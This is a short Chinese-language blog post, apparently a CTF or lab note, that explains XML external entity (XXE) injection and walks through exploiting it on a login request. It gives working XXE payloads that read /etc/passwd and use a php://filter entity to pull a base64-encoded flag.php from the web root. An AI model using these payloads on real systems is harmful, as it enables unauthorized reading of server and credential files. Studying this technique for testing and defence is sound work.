---
title: XML外部实体注入 (XXE漏洞)
date: '2022/1/23 23:15:01'
categories:
  - - web安全
    - inject
    - xxe
description: XXE漏洞的利用场景和流程
abbrlink: bc3fe178
tags:
---

# XML外部实体注入 (XXE漏洞)

## XXE简介
xxe漏洞就是xml外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害

## 利用场景和流程
抓包发现请求包里面直接存在
```xml
<user>
    <username>
        1
    </username>
    <password>
        1
    </password>
</user>

```

测试能否读取文件
```xml
<!DOCTYPE ANY [
    <!ENTITY test SYSTEM "file:///etc/passwd">
]>
<user>
    <username>
        &test;
    </username>
    <password>
        123
    </password>
</user>
```

然后读取flag.php
```xml
<!DOCTYPE ANY [
    <!ENTITY admin SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php">
]>
<user>
    <username>
        &admin;
    </username>
    <password>
        123
    </password>
</user>
```